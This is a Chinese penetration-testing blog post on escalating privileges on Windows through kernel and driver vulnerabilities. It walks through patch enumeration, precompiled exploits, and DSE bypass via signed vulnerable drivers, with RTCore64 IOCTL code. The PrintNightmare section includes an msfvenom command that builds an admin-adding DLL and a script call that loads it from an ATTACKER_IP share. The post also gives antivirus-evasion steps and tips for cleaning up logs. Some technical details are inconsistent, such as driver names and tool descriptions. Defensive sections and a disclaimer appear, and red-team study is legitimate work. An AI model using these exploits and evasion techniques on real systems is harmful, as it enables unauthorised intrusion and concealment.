---
title: Windows提权：内核与驱动漏洞
date: 2025-04-28 06:51:18
tags:
  - 权限提升
  - 渗透测试
description: Windows提权：内核与驱动漏洞——渗透测试实战笔记，含完整攻击链路与防御方案。
categories: 渗透测试
---

## 前言

Windows内核提权是渗透测试与红队行动中的关键环节。从获得一个低权限Shell到拿下SYSTEM，中间的桥梁往往是内核或驱动层面的漏洞。本文将系统性地梳理Windows内核提权的实战方法，涵盖信息收集、补丁对比、预编译Exploit使用、驱动签名强制（DSE）绕过，以及三个影响深远的CVE案例分析。

---

## 一、权限基础：Windows安全模型速览

Windows的访问控制基于以下几个核心概念：

| 概念 | 说明 |
|------|------|
| **Access Token** | 每个进程拥有一个访问令牌，记录其所属用户、组、特权列表 |
| **Integrity Level** | 从Untrusted到System共6个级别，限制跨级别交互 |
| **UAC** | 用户账户控制，管理员默认以`Medium IL`运行，提权需提升至`High IL` |
| **Session 0 Isolation** | 服务运行在Session 0，用户登录在Session 1+，隔离机制防止Shatter攻击 |
| **SYSTEM (NT AUTHORITY\SYSTEM)** | 最高权限账户，比Administrator拥有更多特权 |

渗透攻击的核心目标通常是从`Medium IL`提升至`High IL`（管理员）或直接获取`NT AUTHORITY\SYSTEM`权限。

---

## 二、信息收集：systeminfo与补丁对比

### 2.1 获取系统基础信息

拿到低权限Shell后，首先收集系统版本与补丁情况：

```powershell
systeminfo
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type" /C:"Hotfix"
```

输出示例：

```
Hotfix(s):                 7 Hotfix(s) Installed.
[01]: KB5012170
[02]: KB5014032
[03]: KB5014671
```

### 2.2 利用PowerShell进行补丁枚举

`Get-Hotfix` 获取已安装补丁列表，可配合已知漏洞进行比对：

```powershell
Get-HotFix | Format-Table -AutoSize
# 只显示安全更新类别的补丁 ID
Get-HotFix | Where-Object { $_.HotFixID -match "^KB" } | Select-Object HotFixID, InstalledOn
```

### 2.3 缺失补丁与漏洞枚举工具

常用工具包括：

- **Watson** (GitHub: rasta-mouse/Watson) — 基于C#的缺失补丁枚举，将KB与CVE映射
- **Sherlock** (GitHub: rastamouse/Sherlock) — PowerShell版漏洞扫描
- **WES-NG** (Windows Exploit Suggester - Next Generation) — 将`systeminfo`输出与漏洞数据库交叉比对

**WES-NG 使用示例：**

```bash
# 在靶机上导出 systeminfo
systeminfo > C:\temp\sysinfo.txt

# 在攻击机上运行（需提前更新数据库）
python wes.py sysinfo.txt -i "Elevation of Privilege" --exploits-only

# 仅显示有公开Exploit可利用的漏洞
python wes.py sysinfo.txt --exploits-only
```

**Watson 使用示例：**

```powershell
# 直接在目标机器上运行（需 .NET 4.0+）
.\Watson.exe
```

输出会列出可能受影响的CVE编号、对应的KB，以及是否存在公开Exploit。

### 2.4 手动对比技巧

当无法上传工具时，可手动通过KB查询。微软安全更新指南（MSRC）提供CVE与KB的对应关系：

```
# 查询本地已安装的补丁
wmic qfe get HotfixID | findstr KB

# 结合已知漏洞列表手动排查
# 例：KB5005565 对应 CVE-2021-36934 (HiveNightmare)
```

---

## 三、预编译内核Exploit的使用

### 3.1 Exploit 获取渠道

- **GitHub 仓库**：SecWiki/windows-kernel-exploits 收集了大量预编译的二进制
- **Exploit-DB**：搜索 "Windows local privilege escalation"
- **Packet Storm**：搜索目标版本号

### 3.2 使用流程

以经典的MS16-032 (Secondary Logon Handle) 为例：

```powershell
# 在64位 Windows 7 / Server 2008 R2 上
.\MS16-032.exe

# 部分 Exploit 支持指定启动的程序
.\MS16-032.exe cmd.exe
```

**实战注意事项（踩坑清单）：**

1. **架构匹配**：64位系统必须用64位Exploit，32位Exploit在64位系统上操作64位进程会失败
2. **目标进程选择**：部分Exploit需要指定目标进程PID，如MS16-032需要找到指定条件的进程
3. **Exploit稳定性**：内核漏洞触发后可能导致蓝屏（BSOD），首次运行应备份当前工作
4. **杀软对抗**：预编译的公开Exploit几乎必定被杀软标记，需做免杀处理（混淆、加壳、或自行编译修改）
5. **版本精确性**：即使同为Windows 10，Build号不同（如19041 vs 19044）可能导致Exploit失效

### 3.3 编译自己的Exploit

当需要绕过签名检测或修改Exploit行为时，通常需要自行编译：

```powershell
# 使用 Visual Studio 的 MSBuild
MSBuild.exe .\exploit.sln /p:Configuration=Release /p:Platform=x64

# 或在攻击机上交叉编译后上传
```

---

## 四、驱动签名强制（DSE）绕过

### 4.1 DSE 工作原理

从64位Windows Vista开始，微软要求所有内核模式驱动必须经过数字签名。DSE（Driver Signature Enforcement）阻止加载未经签名的`.sys`文件。

检测签名状态：

```powershell
bcdedit /enum | findstr testsigning
bcdedit /enum | findstr nointegritychecks
```

### 4.2 绕过方法

**方法一：启用 Test Signing Mode（需管理员+重启）**

```cmd
bcdedit /set testsigning on
bcdedit /set nointegritychecks on
shutdown /r /t 0
```

限制：需要管理员权限，需要重启，桌面右下角会出现"Test Mode"水印。

**方法二：利用 TDL4 / Uroburos 等 Bootkit**

通过篡改内核中的`g_CiOptions`（Code Integrity 全局变量）来关闭签名校验：

```c
// 内核中 CI.dll 维护的全局标志
ULONG g_CiOptions;  // 值为 0 表示禁用 DSE
```

公开工具如 **DSEFix** 利用已知的内核驱动漏洞（如WinRing0、Capcom驱动）来写入`g_CiOptions`。

**方法三：利用存在签名的漏洞驱动**

这是一种更隐蔽的方式——加载一个拥有合法签名但存在漏洞的驱动，再通过该驱动的漏洞执行任意内核代码：

```
已知可利用的签名驱动：
- Capcom.sys    — 任意物理内存读写
- WinRing0.sys  — I/O 端口访问
- RTCore64.sys  — MSI Afterburner 驱动，任意MSR读写
- GVCIDrv64.sys — Gigabyte 驱动
```

**利用 RTCore64.sys 关闭 DSE（示例代码思路）：**

```
1. 加载 RTCore64.sys（它有合法签名，DSE不会拦截）
2. 通过 DeviceIoControl 调用驱动的漏洞功能
3. 该驱动允许读写任意MSR（Model Specific Register）
4. 通过 MSR 修改内核标志位以禁用 SMEP/SMAP
5. 或者通过驱动的物理内存读写能力修改 g_CiOptions
```

**方法四：利用 CVE-2019-16098 (Rtkio64.sys)**

Micro-Star MSI Afterburner的驱动`RTCore64.sys`开放了任意物理内存读写的IOCTL接口：

```c
// IOCTL 0x80002008 — 写入指定物理地址
// IOCTL 0x80002000 — 读取指定物理地址
HANDLE hDevice = CreateFileA("\\\\.\\RTCore64", ...);
DWORD bytesReturned;
DeviceIoControl(hDevice, 0x80002008, &input, sizeof(input), NULL, 0, &bytesReturned, NULL);
```

通过该能力可定位并修改内核中的`g_CiOptions`，进而加载未签名驱动。

---

## 五、CVE-2021-1732：win32k 窗口内核提权

### 5.1 漏洞概述

- **影响范围**：Windows 10 (1809/1909/2004/20H2)、Windows Server 2019/20H2
- **漏洞类型**：win32kfull.sys 中存在窗口对象（tagWND）的 Use-After-Free
- **后果**：本地提权至SYSTEM
- **利用复杂度**：中等，公开PoC存在

### 5.2 漏洞根因

`win32kfull.sys` 中的 `xxxCreateWindowEx` 在创建滚动条（ScrollBar）窗口时，回调 `xxxClientToScreen` 会发送 `WM_NCCALCSIZE` 消息到用户态钩子函数。用户态可在钩子中调用 `DestroyWindow` 释放窗口对象，导致返回内核后继续操作已释放的内存（UAF）。

### 5.3 利用过程

```powershell
# 编译好的Exploit（需自行编译以绕过杀软）
CVE-2021-1732.exe

# 预期输出：
# [*] Target: Windows 10 20H2 (Build 19042)
# [+] Exploit Successfully!
# [+] Spawning SYSTEM shell...
```

**PoC 关键逻辑（伪代码）：**

```
1. 创建两个窗口，设置父窗口关系
2. 通过 SetWindowsHookEx 挂载 WH_CALLWNDPROC 钩子
3. 创建第三个窗口触发 WM_NCCALCSIZE
4. 在钩子回调中调用 DestroyWindow，释放窗口
5. 内核返回后继续使用已释放的 tagWND → UAF
6. 利用堆喷（Heap Spray）技术占位被释放的内存
7. 通过伪造 tagWND 结构读取 `gSharedInfo` 进而修改 token
```

### 5.4 防御

- 安装2021年2月安全更新（KB4601319）
- EDR规则检测对`win32kfull.sys`的异常回调

---

## 六、CVE-2022-21882：Win32k 本地提权漏洞

### 6.1 漏洞概述

- **影响范围**：Windows 10 / 11、Windows Server 2019/2022
- **漏洞类型**：win32k 中的输入验证不足导致的内存损坏
- **后果**：通过竞态条件实现本地SYSTEM提权
- **公开利用**：有PoC，利用难度中等偏高

### 6.2 技术分析

漏洞位于 `win32kbase.sys` 的 `xxxMenuWindowProc` / 菜单处理逻辑中。攻击者通过以下方式触发：

1. 并发地在不同线程中操作同一个菜单对象
2. 利用 `SetWindowLongPtr` 和 `EndMenu` 之间的竞态条件
3. 在窗口销毁后仍持有悬挂指针
4. 通过内存占位技术将悬挂指针重新指向可控数据

**竞态窗口示意图：**

```
线程A: EndMenu → 释放菜单窗口内存
线程B: SetWindowLongPtr → 在释放后仍向原地址写入数据
       |
       +→ 悬挂指针 → 内存占位 → 内核任意写入 → Token 替换
```

### 6.3 利用要点

```powershell
# 检查是否易受攻击（安装 KB5010386 之前）
Get-HotFix | Where-Object { $_.HotFixID -eq "KB5010386" }

# 如返回空，说明该补丁未安装，可能存在漏洞
```

**利用难点：**
- 竞态条件触发概率非100%，多次运行常见
- 堆喷布局在不同版本的Windows上需调整
- 虚拟机环境下的时机可能不同于物理机，需反复调试

---

## 七、PrintNightmare：CVE-2021-34527 (Print Spooler)

### 7.1 漏洞概述

- **影响范围**：几乎所有受支持的 Windows 版本
- **漏洞类型**：RpcAddPrinterDriverEx 未正确验证调用者权限
- **后果**：低权限域用户可加载恶意驱动，远程代码执行+本地SYSTEM提权
- **CVSS v3.1**：8.8 (High)

PrintNightmare 实际上涵盖两个漏洞：
- **CVE-2021-34527**：远程代码执行（RCE）角度
- **CVE-2021-1675**：本地权限提升（LPE）角度

两者指向同一根源——Print Spooler服务的`RpcAddPrinterDriverEx`函数没有严格执行驱动签名与权限检查。

### 7.2 漏洞根因

```c
// 简化后的存在缺陷的逻辑
RpcAddPrinterDriverEx(...){
    // 没有验证调用者是否为管理员
    // 没有充分验证驱动DLL的签名
    if (CopyDriverToSystem32() && LoadDriverIntoSpooler()){
        // 驱动在 SYSTEM 进程中加载并执行
        // 攻击者的恶意 DLL 获得 SYSTEM 权限代码执行
    }
}
```

正常情况下，安装打印机驱动需要`SeLoadDriverPrivilege`（仅管理员和打印操作员拥有）。但该函数内部验证逻辑存在缺陷，使普通用户可以绕过此限制。

### 7.3 本地提权利用

**检测是否受影响：**

```powershell
Get-Service -Name Spooler | Select-Object Name, Status

# 检查 Point and Print 注册表设置
Get-ItemProperty "HKLM:\SOFTWARE\Policies\Microsoft\Windows NT\Printers\PointAndPrint" `
    -Name "NoWarningNoElevationOnInstall" -ErrorAction SilentlyContinue
```

**利用步骤：**

1. 生成恶意 DLL：

```bash
# 使用 msfvenom 生成
msfvenom -p windows/x64/exec CMD="net user hacker Pass123! /add && net localgroup administrators hacker /add" \
         -f dll -o evil.dll

# 或用 Impacket 的 ntlmrelayx.py 生成
```

2. 使用公开Exploit（Python版本）：

```bash
# cube0x0 的 CVE-2021-1675 脚本
python3 CVE-2021-1675.py 'DOMAIN/user:password@DC_IP' '\\ATTACKER_IP\share\evil.dll'

# calebstewart 的 CVE-2021-1675 (纯PowerShell远程利用版本)
python3 printnightmare.py -dll evil.dll -target-ip 10.0.0.5 -username user -password pass
```

3. 本地提权（仅需低权限用户）：

```powershell
# 通过本地 Print Spooler RPC 触发
Import-Module .\CVE-2021-1675.ps1
Invoke-Nightmare -DLL "C:\temp\adduser.dll" -NewUser "pwned" -NewPassword "Pass123!"
```

### 7.4 实际的坑（Field Notes）

- **Spooler服务必须运行**：部分安全基线已禁用该服务，需检查`Spooler`服务状态
- **防病毒软件拦截**：打印驱动复制到`C:\Windows\System32\spool\drivers\`时被AV删除
- **版本差异**：公开脚本在不同Build上参数可能不同，Windows Server 2016/2019/2022需分别测试
- **日志痕迹**：驱动安装过程会在`System`事件日志的`Microsoft-Windows-PrintService/Admin`下留下大量记录，事后清理需注意
- **多次利用冲突**：驱动文件名重复会导致安装失败，使用随机命名并清理残留文件

### 7.5 修复与缓解

```powershell
# 临时缓解：停止 Print Spooler 服务
Stop-Service Spooler -Force
Set-Service Spooler -StartupType Disabled

# 生产环境推荐（组策略）：
# 计算机配置 → 管理模板 → 打印机
# "限制指向并打印到这些服务器" → 启用 → 安全服务器列表
# "指向并打印限制" → 启用 → "仅显示安装新的连接的包和驱动程序时的警告和提升提示"
```

微软补丁：KB5005010 + 后续累积更新。注意：微软发布了多个迭代补丁，原始的KB5005010并未完全修复所有攻击向量。

---

## 八、通用内核提权方法论总结

### 8.1 流程总览

```
获得初始立足点 (user-level shell)
    |
    v
信息收集 (systeminfo / Get-HotFix)
    |
    v
补丁对比分析 (WES-NG / Watson / 手动)
    |
    v
候选漏洞筛选 (EoP 类型 / 有公开Exploit)
    |
    v
Exploit投递与编译 (免杀 / 架构匹配)
    |
    v
执行提权 (Spawning SYSTEM shell)
    |
    v
持久化与横向移动
```

### 8.2 Exploit 选择决策树

```
┌─ 已知补丁缺失？── 是 ─→ 匹配公共Exploit
│                        ├─ MS16-032 (Win7/2008R2)
│                        ├─ CVE-2021-1732 (Win10 18H1-20H2)
│                        ├─ CVE-2022-21882 (Win10/11)
│                        └─ PrintNightmare (全版本)
│
└─ 无已知漏洞 ─→ 检查驱动运行状态
                 ├─ 第三方可利用驱动？
                 │   ├─ RTCore64.sys → DSE绕过
                 │   ├─ Capcom.sys → 物理内存读写
                 │   └─ ...
                 └─ 自定义漏洞挖掘
```

### 8.3 免杀最低要求

针对内核Exploit的规避：

```
1. 重编译 → 改变编译时元数据的哈希
2. 字符串混淆 → 避免 "CVE-2021-1732" "Exploit" 等静态特征
3. API 动态解析 → 而非静态导入 CreateRemoteThread / WriteProcessMemory
4. Shellcode 分离与加密 → AES/XOR 编码载荷，运行时解密
5. 进程注入目标选择 → 避免注入到 C:\Windows\System32\ 下敏感进程（首选 svchost.exe / 低风险进程）
```

---

## 九、防御视角：检测与加固

### 9.1 检测指标

- 非管理员进程调用`AdjustTokenPrivileges`开启`SeDebugPrivilege`
- `win32kfull.sys` / `win32kbase.sys` 中产生异常调用栈
- `mscorsvw.exe` 或 `svchost.exe` 以外的进程加载打印机驱动DLL
- 非签名驱动的`DeviceIoControl`高频调用
- 短时间窗口内单一进程触发多个`SYSTEM`令牌打开操作

### 9.2 Sysmon 检测规则

```xml
<Sysmon>
  <EventFiltering>
    <ProcessAccess onmatch="include">
      <!-- 检测非SYSTEM进程获取SYSTEM进程句柄 -->
      <GrantedAccess condition="contains">0x1fffff</GrantedAccess>
      <TargetImage condition="contains">lsass.exe</TargetImage>
    </ProcessAccess>
    <DriverLoad onmatch="include">
      <!-- 检测未签名驱动加载 -->
      <Signature condition="is">false</Signature>
    </DriverLoad>
  </EventFiltering>
</Sysmon>
```

### 9.3 系统加固建议

| 措施 | 效果 | 副作用 |
|------|------|--------|
| 及时安装安全更新 | 阻止已知CVE | 无（正常运维成本） |
| 启用 Credential Guard | 保护 LSASS 内存 | 部分应用兼容性问题 |
| 禁用不必要的驱动（blocklist） | 阻止DSE绕过 | 可能导致硬件外设失效 |
| 启用 HVCI (Memory Integrity) | 防止内核内存篡改 | 约5%性能开销，旧驱动兼容性 |
| AppLocker / WDAC | 限制未授权代码执行 | 管理成本高 |
| 停止 Print Spooler 服务（非打印服务器） | 阻止PrintNightmare | 无法执行打印任务 |

---

## 十、免责声明

**重要法律声明：** 本文所述技术与工具仅供安全研究、授权渗透测试及防御建设参考。未经系统所有者明确书面授权，在任意系统上执行提权操作均属违法行为，可能触犯《刑法》第285条（非法侵入计算机信息系统罪）、第286条（破坏计算机信息系统罪）等相关法律法规。作者不承担任何因滥用本文信息导致的法律责任。

---

## 参考资料

1. [MSRC Security Update Guide](https://msrc.microsoft.com/update-guide)
2. [CVE-2021-1732 Detail - NVD](https://nvd.nist.gov/vuln/detail/CVE-2021-1732)
3. [CVE-2022-21882 Analysis - ZDI](https://www.zerodayinitiative.com/advisories/ZDI-22-257/)
4. [CVE-2021-34527 PrintNightmare - MSRC Advisory](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-34527)
5. [Windows Exploit Suggester - Next Generation (WES-NG)](https://github.com/bitsadmin/wesng)
6. [Watson - Missing KB Enumeration](https://github.com/rasta-mouse/Watson)
7. [RTCore64.sys DSE Bypass Analysis](https://github.com/Barakat/CVE-2019-16098)
8. [[cube0x0] CVE-2021-1675 PrintNightmare LPE](https://github.com/cube0x0/CVE-2021-1675)
